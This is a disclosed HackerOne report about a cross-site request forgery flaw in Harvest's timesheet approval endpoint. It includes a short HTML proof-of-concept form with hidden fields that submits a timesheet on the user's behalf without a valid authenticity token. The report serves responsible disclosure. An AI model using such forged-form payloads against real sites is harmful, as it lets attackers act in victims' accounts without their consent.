@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/164546
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/vijay_kumar1110
+ReportedTo:Harvest(harvest)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:18.08.2017 20:19:06
+
+Summary:
+
+Hi Team,
+
+Description : There is a Authentication token is provided for submitting Time sheet for approval. Also there is a Referral given in header. But both are not validating on server side which leads to successful CSRF attack. 
+
+HTML POC : 
+
+<html>
+<body>
+<form action="https://vijaygangani.harvestapp.com/daily/review" method="post">
+<input type="hidden" name="from_timesheet_beta" value="true">
+<input type="hidden" name="from_screen" value="daily">
+<input type="hidden" name="return_to" value="\time">
+<input type="hidden" name="of_user" value="">
+<input type="hidden" name="submitted_date" value="244">
+<input type="hidden" name="submitted_date_year" value="2016">
+<input type="hidden" name="submitted_date" value="244">
+<input type="hidden" name="authenticity_token" value="">
+<input type="hidden" name="period_begin" value="242">
+<input type="hidden" name="period_begin_year" value="2016">
+<input type="submit">
+</body>
+</html>
+
+
+
+Let me know if you need any other details regarding this.
+
+Best Regards !
+Vijay Kumar 
